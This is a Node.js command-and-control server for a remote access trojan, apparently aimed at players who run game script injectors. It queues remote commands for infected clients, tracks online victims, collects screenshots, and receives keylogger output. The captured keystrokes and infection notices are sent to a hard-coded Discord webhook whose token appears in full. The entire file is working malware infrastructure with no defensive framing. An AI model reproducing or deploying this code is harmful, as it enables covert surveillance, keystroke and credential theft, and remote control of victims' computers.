const http = require('http');
const fetch = require('node-fetch');

let commandQueue = [];
let lastScreenshot = null;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";

global.onlineUsers = new Map();

function cleanupInactiveUsers() {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) {
            global.onlineUsers.delete(key);
        }
    }
}

setInterval(cleanupInactiveUsers, 30 * 1000);

async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: "RAT Control System" }
                }]
            })
        });
    } catch (error) {
        console.error('Discord error:', error);
    }
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Получение команд для клиента
    if (req.method === 'GET' && req.url === '/data') {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const player = url.searchParams.get('player');
        
        // Ищем команды для этого игрока или для всех
        const commandsForPlayer = [];
        const remainingCommands = [];
        
        for (const cmd of commandQueue) {
            if (cmd.target === null || cmd.target === player) {
                commandsForPlayer.push(cmd);
            } else {
                remainingCommands.push(cmd);
            }
        }
        
        commandQueue = remainingCommands;
        
        if (commandsForPlayer.length > 0) {
            const cmd = commandsForPlayer[0];
            res.end(JSON.stringify({
                command: cmd.command,
                args: cmd.args
            }));
        } else {
            res.end(JSON.stringify({
                command: "",
                args: []
            }));
        }
        return;
    }
    
    // Отправка команды от бота
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { command, args, target } = JSON.parse(body);
                
                commandQueue.push({
                    command: command,
                    args: args || [],
                    target: target || null
                });
                
                // Логируем только важные события
                if (command === "inject_notify") {
                    await sendDiscordMessage(
                        "🔌 Новый инжект!",
                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}\n**Инжектор:** ${args[3]}\n**Устройство:** ${args[4]}`,
                        0x00ff00
                    );
                }
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Получение списка онлайн пользователей
    if (req.method === 'GET' && req.url === '/users') {
        cleanupInactiveUsers();
        const users = Array.from(global.onlineUsers.values());
        res.end(JSON.stringify({
            users: users,
            count: users.length
        }));
        return;
    }
    
    // Обновление информации о пользователе
    if (req.method === 'POST' && req.url === '/users') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, place, executor, device } = JSON.parse(body);
                global.onlineUsers.set(player, {
                    player: player,
                    place: place,
                    executor: executor,
                    device: device || "Unknown",
                    lastSeen: Date.now()
                });
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Скриншоты
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/screenshot') {
        res.end(JSON.stringify({ 
            image: lastScreenshot || null 
        }));
        return;
    }
    
    // Кейлоггер
    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                await sendDiscordMessage(
                    "⌨️ Кейлоггер",
                    `\`\`\`${logs.slice(0, 1900)}\`\`\``,
                    0xe74c3c
                );
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Статус сервера
    if (req.method === 'GET' && req.url === '/status') {
        cleanupInactiveUsers();
        res.end(JSON.stringify({
            status: "online",
            online_users: global.onlineUsers.size,
            pending_commands: commandQueue.length
        }));
        return;
    }
    
    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found" }));
});

server.listen(process.env.PORT || 3000, () => {
    console.log("🚀 Сервер запущен на порту 3000");
    console.log("📡 Эндпоинты:");
    console.log("• GET  /data?player=NAME - Получение команд");
    console.log("• POST /command - Отправка команд");
    console.log("• GET  /users - Список онлайн пользователей");
});
